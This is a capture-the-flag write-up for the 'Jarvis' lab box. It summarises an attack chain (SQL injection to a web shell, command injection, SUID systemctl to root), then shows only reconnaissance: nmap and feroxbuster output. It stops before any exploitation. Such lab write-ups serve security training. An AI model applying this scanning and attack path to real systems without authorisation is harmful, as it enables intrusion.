# CTF Writeup: Jarvis

## Lab Description

Jarvis is a medium difficulty Linux box running a web server, which has DoS and brute force protection enabled. A page is found to be vulnerable to SQL injection, which requires manual exploitation. This service allows the writing of a shell to the web root for the foothold. The www user is allowed to execute a script as another user, and the script is vulnerable to command injection. On further enumeration, systemctl is found to have the SUID bit set, which is leveraged to gain a root shell. 

---

## Reconaissance


An initial scan revealed the following services running on the target.

```
nmap -A -p- --min-rate 10000 10.129.229.137                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 10:23 EDT
Nmap scan report for 10.129.229.137
Host is up (0.017s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.25 (Debian)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=10/25%OT=22%CT=1%CU=36352%PV=Y%DS=2%DC=T%G=Y%TM=68FCDD
OS:8B%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=8)SE
OS:Q(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=8)SEQ(SP=105%GCD=1%ISR=107%TI=Z
OS:%CI=Z%II=I%TS=8)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=8)SEQ(SP=FF%G
OS:CD=1%ISR=109%TI=Z%CI=Z%II=I%TS=8)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M5
OS:52NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=7120%W2=7120
OS:%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M552NNSNW7%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=4
OS:0%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   15.89 ms 10.10.14.1
2   19.69 ms 10.129.229.137

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.06 seconds
```

There seems to be 2 instances of http running on different ports, let's start with mapping jarvis.htb domain to the target ip in our local dns file /etc/hosts


```
sudo echo "10.129.229.137 jarvis.htb" | sudo tee -a /etc/hosts
```

Actually when displaying the homepage, we can see the domain "supersecurehotel.htb" at the top-left, let's map this domain to the target ip instead of jarvis.htb!

```
nano /etc/hosts
```

Ran feroxbuster on the domain & retrieved an /phpmyadmin panel including login page.

```
feroxbuster -u http://supersecurehotel.htb                                                             
                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://supersecurehotel.htb/
 🚩  In-Scope Url          │ supersecurehotel.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      282c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      285c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      329c http://supersecurehotel.htb/images => http://supersecurehotel.htb/images/
200      GET      130l      681w    52554c http://supersecurehotel.htb/images/menu-8.jpg
200      GET      327l     1797w   154229c http://supersecurehotel.htb/images/person2.jpg
200      GET      319l     1799w   172775c http://supersecurehotel.htb/images/amenities-3.jpg
200      GET      350l     1992w   186368c http://supersecurehotel.htb/images/amenities-2.jpg
200      GET      188l     1112w    99142c http://supersecurehotel.htb/images/menu-1.jpg
200      GET      425l     2318w   208928c http://supersecurehotel.htb/images/blog-3.jpg
200      GET      372l     1701w   151284c http://supersecurehotel.htb/images/room-6.jpg
200      GET     2234l    12114w   937820c http://supersecurehotel.htb/images/img_bg_4.jpg
200      GET     1564l     8377w   800721c http://supersecurehotel.htb/images/img_bg_5.jpg
200      GET     3596l    18959w  1451421c http://supersecurehotel.htb/images/img_bg_1.jpg
302      GET      101l      231w     3024c http://supersecurehotel.htb/room.php => index.php
200      GET      205l     1368w     8111c http://supersecurehotel.htb/js/jquery.easing.1.3.js
200      GET      275l      703w     6864c http://supersecurehotel.htb/css/flexslider.css
200      GET        6l       69w     4378c http://supersecurehotel.htb/js/respond.min.js
200      GET        4l      317w    15413c http://supersecurehotel.htb/js/modernizr-2.6.2.min.js
200      GET      512l     1690w    17946c http://supersecurehotel.htb/css/bootstrap-datepicker.css
200      GET     2334l     3908w    35786c http://supersecurehotel.htb/css/icomoon.css
200      GET        4l      224w    20932c http://supersecurehotel.htb/js/jquery.magnific-popup.min.js
200      GET        1l        1w      680c http://supersecurehotel.htb/fonts/flaticon/backup.txt
200      GET      165l     1079w    94430c http://supersecurehotel.htb/images/menu-4.jpg
200      GET       47l       98w     1280c http://supersecurehotel.htb/fonts/flaticon/font/_flaticon.scss
200      GET       54l      258w     5048c http://supersecurehotel.htb/fonts/flaticon/font/Flaticon.eot
200      GET      475l     1103w    17856c http://supersecurehotel.htb/fonts/flaticon/font/flaticon.html
200      GET      772l     1723w    58132c http://supersecurehotel.htb/fonts/bootstrap/glyphicons-halflings-regular.ttf
200      GET      132l     2213w    23381c http://supersecurehotel.htb/fonts/flaticon/font/Flaticon.svg
200      GET      405l     2081w    60555c http://supersecurehotel.htb/fonts/flaticon/license/license.pdf
200      GET      258l     1722w   145650c http://supersecurehotel.htb/images/room-1.jpg
200      GET       73l      429w    32536c http://supersecurehotel.htb/fonts/bootstrap/glyphicons-halflings-regular.woff2
200      GET      106l      587w    35387c http://supersecurehotel.htb/fonts/bootstrap/glyphicons-halflings-regular.eot
200      GET     6257l    14923w   134656c http://supersecurehotel.htb/css/bootstrap.css
200      GET      196l     1118w    93493c http://supersecurehotel.htb/images/menu-2.jpg
200      GET     1219l     9398w   231616c http://supersecurehotel.htb/fonts/icomoon/icomoon.eot
200      GET      279l     1736w   138783c http://supersecurehotel.htb/images/room-4.jpg
200      GET     1219l     9397w   231436c http://supersecurehotel.htb/fonts/icomoon/icomoon.ttf
200      GET     1219l     9401w   231516c http://supersecurehotel.htb/fonts/icomoon/icomoon.woff
200      GET      779l    49537w   632126c http://supersecurehotel.htb/fonts/icomoon/icomoon.svg
301      GET        9l       28w      328c http://supersecurehotel.htb/fonts => http://supersecurehotel.htb/fonts/
301      GET        9l       28w      333c http://supersecurehotel.htb/phpmyadmin => http://supersecurehotel.htb/phpmyadmin/
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/config.default.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/vendor_config.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/error.inc.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/language_stats.inc.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/special_schema_links.inc.php
200      GET        1l        1w       53c http://supersecurehotel.htb/phpmyadmin/themes/dot.gif
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/tbl_common.inc.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/mysql_relations.inc.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/tbl_columns_definition_form.inc.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/db_common.inc.php
200      GET       20l       33w      615c http://supersecurehotel.htb/phpmyadmin/themes/svg_gradient.php
200      GET        6l       18w      150c http://supersecurehotel.htb/phpmyadmin/templates/secondary_tabs.twig
200      GET       11l       41w      309c http://supersecurehotel.htb/phpmyadmin/templates/preview_sql.twig
200      GET        6l       42w      389c http://supersecurehotel.htb/phpmyadmin/templates/select_all.twig
200      GET       16l       59w      507c http://supersecurehotel.htb/phpmyadmin/templates/theme_preview.twig
200      GET       22l       58w      676c http://supersecurehotel.htb/phpmyadmin/templates/header_location.twig
200      GET       11l       61w      401c http://supersecurehotel.htb/phpmyadmin/templates/radio_fields.twig
200      GET       16l      105w      694c http://supersecurehotel.htb/phpmyadmin/templates/div_for_slider_effect.twig
200      GET       24l       67w     1023c http://supersecurehotel.htb/phpmyadmin/templates/toggle_button.twig
200      GET      123l      365w     4959c http://supersecurehotel.htb/phpmyadmin/templates/view_create.twig
200      GET       11l       72w      502c http://supersecurehotel.htb/phpmyadmin/templates/dropdown.twig
200      GET        8l       25w      305c http://supersecurehotel.htb/phpmyadmin/templates/filter.twig
200      GET       12l       54w      480c http://supersecurehotel.htb/phpmyadmin/templates/prefs_twofactor_confirm.twig
200      GET       15l       74w      702c http://supersecurehotel.htb/phpmyadmin/templates/prefs_autoload.twig
200      GET        4l       23w      218c http://supersecurehotel.htb/phpmyadmin/templates/fk_checkbox.twig
200      GET       20l       72w      794c http://supersecurehotel.htb/phpmyadmin/templates/start_and_number_of_rows_panel.twig
200      GET       13l       38w      368c http://supersecurehotel.htb/phpmyadmin/templates/prefs_twofactor_configure.twig
200      GET        6l       53w      369c http://supersecurehotel.htb/phpmyadmin/templates/checkbox.twig
200      GET       32l       80w      874c http://supersecurehotel.htb/phpmyadmin/templates/select_lang.twig
200      GET       58l      240w     1878c http://supersecurehotel.htb/phpmyadmin/templates/prefs_twofactor.twig
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Footer.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Response.php
500      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/ListDatabase.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Types.php
500      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/SysInfoLinux.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/ParseAnalyze.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Session.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Relation.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/RecentFavoriteTable.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/CreateAddField.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/File.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/SubPartition.php
500      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Error.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/ReplicationGui.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Header.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/CentralColumns.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Transformations.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/TwoFactor.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Tracking.php
500      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Import.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/SystemDatabase.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/SavedSearches.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Index.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Table.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Template.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/ErrorHandler.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Config.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Operations.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Plugins.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Normalization.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Font.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/ErrorReport.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Export.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/CheckUserPrivileges.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/IndexColumn.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/SysInfoBase.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Menu.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Sql.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/UserPreferences.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Core.php
500      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Partition.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/InsertEdit.php
200      GET        9l       17w      203c http://supersecurehotel.htb/phpmyadmin/themes/pmahomme/theme.json
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/themes/pmahomme/layout.inc.php
200      GET        8l       17w      203c http://supersecurehotel.htb/phpmyadmin/themes/original/theme.json
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/themes/original/layout.inc.php
200      GET       12l       42w      338c http://supersecurehotel.htb/phpmyadmin/templates/navigation/logo.twig
200      GET        4l       13w      114c http://supersecurehotel.htb/phpmyadmin/templates/components/error_message.twig
200      GET       49l      124w     1601c http://supersecurehotel.htb/phpmyadmin/templates/export/alias_add.twig
200      GET       10l       29w      267c http://supersecurehotel.htb/phpmyadmin/templates/export/alias_item.twig
200      GET        8l       30w      340c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_type.twig
200      GET        8l       35w      325c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_null.twig
200      GET      237l      792w     7722c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_attributes.twig
200      GET       11l       40w      404c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_length.twig
200      GET       15l       65w      631c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/move_column.twig
200      GET        7l       28w      293c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_auto_increment.twig
200      GET      122l      488w     4837c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/table_fields_definitions.twig
200      GET       16l       60w      630c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_adjust_privileges.twig
200      GET        9l       41w      423c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/transformation_option.twig
200      GET       26l      123w     1238c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/transformation.twig
200      GET       46l      203w     1758c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_default.twig
200      GET       43l      164w     1503c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_name.twig
200      GET       24l      127w     1243c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_indexes.twig
200      GET      108l      534w    41051c http://supersecurehotel.htb/phpmyadmin/themes/original/screen.png
200      GET      152l      410w     6075c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_definitions_form.twig
200      GET       17l       68w      763c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/mime_type.twig
200      GET       20l       78w      791c http://supersecurehotel.htb/phpmyadmin/templates/encoding/kanji_encoding_form.twig
200      GET       91l      493w    45201c http://supersecurehotel.htb/phpmyadmin/themes/pmahomme/screen.png
200      GET      180l      539w     7825c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/partitions.twig
200      GET        7l       21w      218c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_comment.twig
200      GET       21l      111w      909c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_attribute.twig
200      GET       31l       96w      959c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_virtuality.twig
200      GET        7l       29w      287c http://supersecurehotel.htb/phpmyadmin/templates/columns_definitions/column_extra.twig
200      GET       13l       76w      728c http://supersecurehotel.htb/phpmyadmin/templates/login/header.twig
200      GET        7l       24w      178c http://supersecurehotel.htb/phpmyadmin/templates/login/twofactor.twig
200      GET        1l        1w        7c http://supersecurehotel.htb/phpmyadmin/templates/login/footer.twig
200      GET       19l      153w      983c http://supersecurehotel.htb/phpmyadmin/templates/list/item.twig
200      GET       14l       78w      467c http://supersecurehotel.htb/phpmyadmin/templates/list/unordered.twig
200      GET       25l       81w     1020c http://supersecurehotel.htb/phpmyadmin/templates/console/bookmark_content.twig
200      GET       12l       44w      378c http://supersecurehotel.htb/phpmyadmin/templates/console/query_action.twig
200      GET       14l       58w      522c http://supersecurehotel.htb/phpmyadmin/templates/privileges/add_privileges_table.twig
200      GET       10l       39w      331c http://supersecurehotel.htb/phpmyadmin/templates/console/toolbar.twig
200      GET      192l      645w     9549c http://supersecurehotel.htb/phpmyadmin/templates/console/display.twig
200      GET       24l       77w      902c http://supersecurehotel.htb/phpmyadmin/templates/privileges/initials_row.twig
200      GET       18l       81w      841c http://supersecurehotel.htb/phpmyadmin/templates/privileges/global_priv_table.twig
200      GET       23l       73w      978c http://supersecurehotel.htb/phpmyadmin/templates/privileges/require_options_item.twig
200      GET       13l       43w      374c http://supersecurehotel.htb/phpmyadmin/templates/privileges/resource_limits.twig
200      GET        9l       32w      442c http://supersecurehotel.htb/phpmyadmin/templates/privileges/choose_user_group.twig
200      GET       17l       97w      867c http://supersecurehotel.htb/phpmyadmin/templates/privileges/delete_user_fieldset.twig
200      GET       11l       33w      389c http://supersecurehotel.htb/phpmyadmin/templates/privileges/resource_limit_item.twig
200      GET       62l      203w     2351c http://supersecurehotel.htb/phpmyadmin/templates/privileges/privileges_summary.twig
200      GET        8l       38w      397c http://supersecurehotel.htb/phpmyadmin/templates/privileges/add_user_fieldset.twig
200      GET       14l       45w      527c http://supersecurehotel.htb/phpmyadmin/templates/privileges/require_options.twig
200      GET       24l       91w      986c http://supersecurehotel.htb/phpmyadmin/templates/privileges/column_privileges.twig
200      GET       14l       58w      542c http://supersecurehotel.htb/phpmyadmin/templates/privileges/add_privileges_routine.twig
200      GET       14l       62w      544c http://supersecurehotel.htb/phpmyadmin/templates/privileges/add_privileges_database.twig
200      GET        9l       30w      313c http://supersecurehotel.htb/phpmyadmin/templates/privileges/global_priv_tbl_item.twig
200      GET       26l       92w     1209c http://supersecurehotel.htb/phpmyadmin/templates/privileges/edit_routine_privileges.twig
200      GET       14l       50w      410c http://supersecurehotel.htb/phpmyadmin/templates/privileges/privileges_summary_row.twig
200      GET        7l       27w      314c http://supersecurehotel.htb/phpmyadmin/templates/javascript/display.twig
200      GET       48l      116w     1187c http://supersecurehotel.htb/phpmyadmin/templates/server/sub_page_header.twig
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/LanguageManager.php
200      GET       32l      111w     1228c http://supersecurehotel.htb/phpmyadmin/templates/error/report_form.twig
200      GET        1l        3w       16c http://supersecurehotel.htb/phpmyadmin/templates/test/echo.twig
200      GET        1l        2w       14c http://supersecurehotel.htb/phpmyadmin/templates/test/static.twig
200      GET        2l        6w       32c http://supersecurehotel.htb/phpmyadmin/templates/test/add_data.twig
200      GET      219l      482w     8627c http://supersecurehotel.htb/phpmyadmin/templates/table/index_form.twig
200      GET       17l       42w      564c http://supersecurehotel.htb/phpmyadmin/templates/table/secondary_tabs.twig
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/VersionInformation.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Util.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Advisor.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/OutputBuffering.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/FileListing.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Sanitize.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/SysInfo.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/ThemeManager.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/BrowseForeigners.php
301      GET        9l       28w      337c http://supersecurehotel.htb/phpmyadmin/doc => http://supersecurehotel.htb/phpmyadmin/doc/
200      GET      158l      524w     7012c http://supersecurehotel.htb/phpmyadmin/doc/html/other.html
200      GET      172l      665w     8462c http://supersecurehotel.htb/phpmyadmin/doc/html/require.html
200      GET      145l      494w     6222c http://supersecurehotel.htb/phpmyadmin/doc/html/vendors.html
200      GET      102l      273w     3662c http://supersecurehotel.htb/phpmyadmin/doc/html/search.html
200      GET      219l     1110w    12017c http://supersecurehotel.htb/phpmyadmin/doc/html/security.html
200      GET      169l      546w     8659c http://supersecurehotel.htb/phpmyadmin/doc/html/user.html
200      GET      130l      501w     6266c http://supersecurehotel.htb/phpmyadmin/doc/html/settings.html
200      GET      194l      935w    10153c http://supersecurehotel.htb/phpmyadmin/doc/html/relations.html
200      GET      188l      945w    10064c http://supersecurehotel.htb/phpmyadmin/doc/html/privileges.html
200      GET      224l      898w    11438c http://supersecurehotel.htb/phpmyadmin/doc/html/themes.html
200      GET      179l      729w     9523c http://supersecurehotel.htb/phpmyadmin/doc/html/two_factor.html
200      GET      151l      529w     6572c http://supersecurehotel.htb/phpmyadmin/doc/html/copyright.html
200      GET      195l      955w    11055c http://supersecurehotel.htb/phpmyadmin/doc/html/intro.html
200      GET      470l     2483w    27564c http://supersecurehotel.htb/phpmyadmin/doc/html/import_export.html
200      GET      117l      365w     4877c http://supersecurehotel.htb/phpmyadmin/doc/html/developers.html
200      GET      228l      904w    14976c http://supersecurehotel.htb/phpmyadmin/doc/html/index.html
200      GET      186l      867w    10054c http://supersecurehotel.htb/phpmyadmin/doc/html/bookmarks.html
200      GET      300l     1179w    15016c http://supersecurehotel.htb/phpmyadmin/doc/html/charts.html
200      GET      245l     1320w    13570c http://supersecurehotel.htb/phpmyadmin/doc/html/transformations.html
200      GET     1353l     3569w    45625c http://supersecurehotel.htb/phpmyadmin/doc/html/credits.html
200      GET      638l     2783w    33723c http://supersecurehotel.htb/phpmyadmin/doc/html/glossary.html
200      GET        1l       27w    71187c http://supersecurehotel.htb/phpmyadmin/doc/html/searchindex.js
200      GET     1454l    10004w   122012c http://supersecurehotel.htb/phpmyadmin/doc/html/setup.html
200      GET     4265l     4761w   150011c http://supersecurehotel.htb/phpmyadmin/doc/html/genindex.html
301      GET        9l       28w      337c http://supersecurehotel.htb/phpmyadmin/sql => http://supersecurehotel.htb/phpmyadmin/sql/
200      GET       24l       82w      671c http://supersecurehotel.htb/phpmyadmin/sql/upgrade_tables_4_7_0+.sql
200      GET       47l      147w     1665c http://supersecurehotel.htb/phpmyadmin/sql/upgrade_column_info_4_3_0+.sql
200      GET      355l     1222w    10948c http://supersecurehotel.htb/phpmyadmin/sql/create_tables.sql
200      GET      144l      676w     5691c http://supersecurehotel.htb/phpmyadmin/sql/upgrade_tables_mysql_4_1_2+.sql
200      GET     6192l    29274w   357515c http://supersecurehotel.htb/phpmyadmin/doc/html/config.html
200      GET     2017l    18290w   202410c http://supersecurehotel.htb/phpmyadmin/doc/html/faq.html
301      GET        9l       28w      326c http://supersecurehotel.htb/css => http://supersecurehotel.htb/css/
301      GET        9l       28w      325c http://supersecurehotel.htb/js => http://supersecurehotel.htb/js/
200      GET      368l      876w     7781c http://supersecurehotel.htb/css/magnific-popup.css
200      GET        1l       82w     3630c http://supersecurehotel.htb/css/owl.carousel.min.css
200      GET       52l      123w     2315c http://supersecurehotel.htb/css/owl.theme.default.min.css
200      GET        7l      152w     8835c http://supersecurehotel.htb/js/jquery.waypoints.min.js
200      GET       49l      172w     2678c http://supersecurehotel.htb/js/google_map.js
200      GET      286l      482w     6117c http://supersecurehotel.htb/js/main.js
200      GET        7l       12w    76082c http://supersecurehotel.htb/css/bootstrap.css.map
200      GET        7l       12w    27181c http://supersecurehotel.htb/css/style.css.map
200      GET     1628l     4730w    46275c http://supersecurehotel.htb/css/style.css
200      GET        7l      430w    36816c http://supersecurehotel.htb/js/bootstrap.min.js
200      GET     3351l     7443w    73008c http://supersecurehotel.htb/css/animate.css
200      GET        2l      276w    40401c http://supersecurehotel.htb/js/owl.carousel.min.js
200      GET        5l     1307w    84380c http://supersecurehotel.htb/js/jquery.min.js
301      GET        9l       28w      339c http://supersecurehotel.htb/phpmyadmin/setup => http://supersecurehotel.htb/phpmyadmin/setup/
301      GET        9l       28w      342c http://supersecurehotel.htb/phpmyadmin/examples => http://supersecurehotel.htb/phpmyadmin/examples/
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/examples/signon-script.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/examples/config.manyhosts.inc.php
200      GET       22l       78w      787c http://supersecurehotel.htb/phpmyadmin/examples/signon.php
301      GET        9l       28w      343c http://supersecurehotel.htb/phpmyadmin/setup/lib => http://supersecurehotel.htb/phpmyadmin/setup/lib/
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/setup/lib/ConfigGenerator.php
200      GET        1l        2w       15c http://supersecurehotel.htb/phpmyadmin/setup/lib/common.inc.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/setup/lib/Index.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/setup/lib/FormProcessing.php
200      GET      251l     1479w   117871c http://supersecurehotel.htb/images/amenities-1.jpg
200      GET       10l       64w     3079c http://supersecurehotel.htb/images/loc.png
200      GET      130l      782w    64595c http://supersecurehotel.htb/images/menu-9.jpg
200      GET      179l      878w    73643c http://supersecurehotel.htb/images/menu-5.jpg
200      GET      151l      917w    79720c http://supersecurehotel.htb/images/menu-6.jpg
200      GET       55l      169w     1410c http://supersecurehotel.htb/js/magnific-popup-options.js
200      GET      194l     1176w   111879c http://supersecurehotel.htb/images/menu-3.jpg
200      GET      256l     1327w   118351c http://supersecurehotel.htb/images/menu-7.jpg
200      GET       35l       80w      972c http://supersecurehotel.htb/fonts/flaticon/font/flaticon.css
200      GET      237l     1489w   125548c http://supersecurehotel.htb/images/room-3.jpg
200      GET      215l     1359w   111330c http://supersecurehotel.htb/images/blog-2.jpg
200      GET        5l      150w    22342c http://supersecurehotel.htb/js/jquery.flexslider-min.js
301      GET        9l       28w      346c http://supersecurehotel.htb/phpmyadmin/setup/frames => http://supersecurehotel.htb/phpmyadmin/setup/frames/
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/setup/frames/form.inc.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/setup/frames/servers.inc.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/setup/frames/index.inc.php
200      GET     1008l     3919w   349898c http://supersecurehotel.htb/images/img_bg_3.jpg
200      GET      308l     1963w   165172c http://supersecurehotel.htb/images/room-2.jpg
200      GET      311l     1704w   159080c http://supersecurehotel.htb/images/room-5.jpg
200      GET      292l      840w    11849c http://supersecurehotel.htb/rooms-suites.php
200      GET      272l      674w     9304c http://supersecurehotel.htb/dining-bar.php
200      GET       54l      255w     4864c http://supersecurehotel.htb/fonts/flaticon/font/Flaticon.ttf
